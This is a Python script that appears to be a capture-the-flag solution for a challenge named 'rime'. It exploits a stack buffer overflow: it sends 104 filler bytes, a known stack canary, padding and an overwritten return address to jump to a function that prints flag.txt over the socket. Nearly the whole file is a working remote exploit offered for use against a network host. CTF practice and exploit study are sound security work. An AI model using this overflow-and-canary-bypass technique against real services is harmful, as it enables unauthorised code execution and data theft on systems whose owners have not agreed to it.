#!/usr/bin/env python3
"""rime: blind ret2flag.txt.

The reading routine at 0x400640 has a 104-byte stack buffer, then the
canary at offset 104, 8 bytes of padding at 112, and the saved return
address at offset 120.  Returning to 0x4005a0 opens flag.txt, reads it
into its own stack buffer, and writes it to the client socket (global fd).
"""
import socket, time, select, struct, sys, os

HOST = os.environ.get("HOST", "0.cloud.chals.io")
PORT = int(os.environ.get("PORT", "24359"))
BUF = 104
CANARY = bytes.fromhex(os.environ.get("CANARY", "002b61dd0d486293"))
WIN = int(os.environ.get("WIN", "0x4005a0"), 0)

def recv_until(s, marker, timeout=8.0):
    out = b""
    end = time.time() + timeout
    while marker not in out:
        left = end - time.time()
        if left <= 0:
            break
        r, _, _ = select.select([s], [], [], left)
        if not r:
            break
        try:
            d = s.recv(65536)
        except Exception:
            break
        if not d:
            break
        out += d
    return out

def main():
    canary_path = "canary.txt"
    canary = CANARY
    if os.path.exists(canary_path):
        canary = bytes.fromhex(open(canary_path).read().strip())
    print(f"canary = {canary.hex()}", file=sys.stderr)
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(8)
    banner = recv_until(s, b"reading> ")
    sys.stderr.write(banner.decode("latin1"))
    payload = b"A" * BUF + canary + b"B" * 8 + struct.pack("<Q", WIN)
    s.sendall(payload)
    out = b""
    end = time.time() + 5.0
    while time.time() < end:
        r, _, _ = select.select([s], [], [], max(0, end - time.time()))
        if not r:
            break
        try:
            d = s.recv(65536)
        except Exception:
            break
        if not d:
            break
        out += d
    s.close()
    sys.stdout.buffer.write(out)
    sys.stdout.flush()

if __name__ == "__main__":
    main()
